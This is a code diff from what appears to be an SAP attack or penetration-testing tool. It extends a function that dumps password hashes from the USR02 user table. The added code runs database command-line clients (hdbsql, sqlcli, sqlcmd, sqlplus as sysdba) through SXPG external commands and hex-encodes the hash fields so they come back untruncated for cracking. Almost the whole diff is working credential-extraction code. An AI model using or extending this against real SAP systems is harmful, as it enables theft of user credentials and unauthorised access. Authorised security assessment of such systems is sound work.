@@ -1503,21 +1503,161 @@ def download_password_hashes(node: SAPNode,
                              creds: Credentials = None) -> list:
     """Download password hashes from USR02 table.
 
-    Returns list of dicts with fields: MANDT, BNAME, BCODE, PASSCODE,
-    PWDSALTEDHASH, CODVN, USTYP, UFLAG.
+    Tries two methods in order:
+      1. SXPG database CLI (hdbsql/sqlcli/sqlcmd/sqlplus) — returns FULL hashes
+         with BINTOHEX/RAWTOHEX encoding (no truncation)
+      2. RFC_READ_TABLE — returns HALF hashes (RAW fields truncated to ~8 hex
+         chars due to CHAR conversion)
 
-    PWDSALTEDHASH is the iSSHA-1 salted hash used in newer SAP systems
-    (code version H and above).  On older systems the field may be empty.
+    Returns list of dicts with fields: MANDT, BNAME, BCODE, PASSCODE,
+    PWDSALTEDHASH, CODVN, USTYP, UFLAG, hash_quality ("full" or "half").
+
+    PWDSALTEDHASH is always full (VARCHAR, no truncation issue).
     """
-    print(f"[*] Downloading password hashes from {node.sid}...")
+    print(f"[*] {node.sid}: Downloading password hashes...")
+
+    # --- Method 1: Direct DB query via SXPG (full hashes) ---
+    rows = _download_hashes_via_sxpg(node, creds)
+    if rows:
+        print(f"[+] {node.sid}: Downloaded {len(rows)} FULL password hashes "
+              f"via database CLI")
+        return rows
+
+    # --- Method 2: RFC_READ_TABLE (half hashes for BCODE/PASSCODE) ---
+    print(f"[*] {node.sid}: Falling back to RFC_READ_TABLE (half hashes)...")
     fields = ["MANDT", "BNAME", "BCODE", "PASSCODE", "PWDSALTEDHASH",
               "CODVN", "USTYP", "UFLAG"]
     rows = read_table(node, "USR02", fields=fields, creds=creds, max_rows=9999)
     if rows:
-        print(f"[+] Downloaded {len(rows)} password hashes from {node.sid}")
+        for r in rows:
+            r["hash_quality"] = "half"
+        print(f"[+] {node.sid}: Downloaded {len(rows)} password hashes "
+              f"(half hashes — BCODE/PASSCODE may be truncated)")
     else:
-        print(f"[-] No password hashes retrieved from {node.sid}")
+        print(f"[-] {node.sid}: No password hashes retrieved")
     return rows
+
+
+def _download_hashes_via_sxpg(node: SAPNode,
+                               creds: Credentials = None) -> list | None:
+    """Download FULL password hashes via direct DB query through SXPG.
+
+    Uses execute_local_command() to run the database CLI and query USR02
+    with BINTOHEX/RAWTOHEX to get un-truncated binary hash fields.
+
+    The SXPG LOG MESSAGE field truncates at ~128 chars per line, so we
+    run separate queries for each field and merge by row index.
+
+    Returns list of dicts, or None if SXPG/DB query is not available.
+    """
+    db_type = (node.db_type or "").upper()
+    if not db_type:
+        return None
+
+    chunk = 120  # max hex chars per SXPG output line
+
+    if db_type in ("HDB", "HANA"):
+        tbl = "USR02"
+        hex_fn_bcode = "BINTOHEX(BCODE)"
+        hex_fn_passcode = "BINTOHEX(PASSCODE)"
+        sub_fn = "SUBSTR"
+        def run_q(sql):
+            return execute_local_command(node, "hdbsql",
+                                         f"-U DEFAULT -x {sql}", creds)
+    elif db_type in ("ADA", "MAXDB", "ADABAS"):
+        tbl = "USR02"
+        hex_fn_bcode = "RAWTOHEX(BCODE)"
+        hex_fn_passcode = "RAWTOHEX(PASSCODE)"
+        sub_fn = "SUBSTR"
+        def run_q(sql):
+            return execute_local_command(node, "sqlcli",
+                                         f"-U DEFAULT {sql}", creds)
+    elif db_type == "MSS":
+        sid = node.sid
+        tbl = f"[{sid}].[{sid}].[USR02]"
+        hex_fn_bcode = "CONVERT(VARCHAR(100),BCODE,2)"
+        hex_fn_passcode = "CONVERT(VARCHAR(100),PASSCODE,2)"
+        sub_fn = "SUBSTRING"
+        def run_q(sql):
+            return execute_local_command(node, "sqlcmd",
+                                         f"-S localhost -h -1 -W -Q {sql}", creds)
+    elif db_type in ("ORA", "ORACLE"):
+        tbl = "SAPSR3.USR02"
+        hex_fn_bcode = "RAWTOHEX(BCODE)"
+        hex_fn_passcode = "RAWTOHEX(PASSCODE)"
+        sub_fn = "SUBSTR"
+        def run_q(sql):
+            return execute_local_command(node, "sqlplus",
+                                         f"-S / as sysdba @/dev/stdin <<< {sql}", creds)
+    else:
+        return None
+
+    print(f"[*] {node.sid}: Querying USR02 via SXPG ({db_type} CLI) "
+          f"for full hashes...")
+
+    # Query 1: MANDT, BNAME, CODVN, USTYP, UFLAG, PWDSALTEDHASH (all CHAR fields)
+    r_meta = run_q(
+        f"SELECT MANDT||'~~~'||BNAME||'~~~'||CODVN||'~~~'||USTYP"
+        f"||'~~~'||UFLAG||'~~~'||PWDSALTEDHASH FROM {tbl}")
+
+    if not r_meta.get("success"):
+        print(f"[-] {node.sid}: SXPG USR02 meta query failed: "
+              f"{r_meta.get('error', '')}")
+        return None
+
+    # Query 2: BCODE hex (may need 2 chunks for 80 hex chars)
+    r_bcode = run_q(f"SELECT {hex_fn_bcode} FROM {tbl}")
+
+    # Query 3: PASSCODE hex
+    r_passcode = run_q(f"SELECT {hex_fn_passcode} FROM {tbl}")
+
+    # Parse output lines
+    def _clean(result):
+        lines = []
+        for line in result.get("output", []):
+            clean = line.strip().strip('"').strip("'")
+            if clean.startswith("|") and clean.endswith("|"):
+                clean = clean[1:-1].strip()
+            elif clean.startswith("|"):
+                clean = clean[1:].strip()
+            if not clean or clean.startswith("---") or clean.startswith("==="):
+                continue
+            up = clean.upper()
+            if up.startswith(("MANDT", "BINTOHEX", "RAWTOHEX", "CONVERT",
+                              "SUBSTR", "EXPRESSION", "BCODE", "PASSCODE")):
+                continue
+            if clean.startswith("*") or "rows selected" in clean.lower():
+                continue
+            lines.append(clean)
+        return lines
+
+    meta_lines = _clean(r_meta)
+    bcode_lines = _clean(r_bcode) if r_bcode.get("success") else []
+    passcode_lines = _clean(r_passcode) if r_passcode.get("success") else []
+
+    if not meta_lines:
+        print(f"[-] {node.sid}: SXPG USR02 query returned no data")
+        return None
+
+    rows = []
+    for i, meta in enumerate(meta_lines):
+        parts = meta.split("~~~")
+        if len(parts) < 5:
+            continue
+        row = {
+            "MANDT": parts[0].strip(),
+            "BNAME": parts[1].strip(),
+            "CODVN": parts[2].strip(),
+            "USTYP": parts[3].strip(),
+            "UFLAG": parts[4].strip(),
+            "PWDSALTEDHASH": parts[5].strip() if len(parts) > 5 else "",
+            "BCODE": bcode_lines[i].strip().upper() if i < len(bcode_lines) else "",
+            "PASSCODE": passcode_lines[i].strip().upper() if i < len(passcode_lines) else "",
+            "hash_quality": "full",
+        }
+        rows.append(row)
+
+    return rows if rows else None
 
 
 # ---------------------------------------------------------------------------
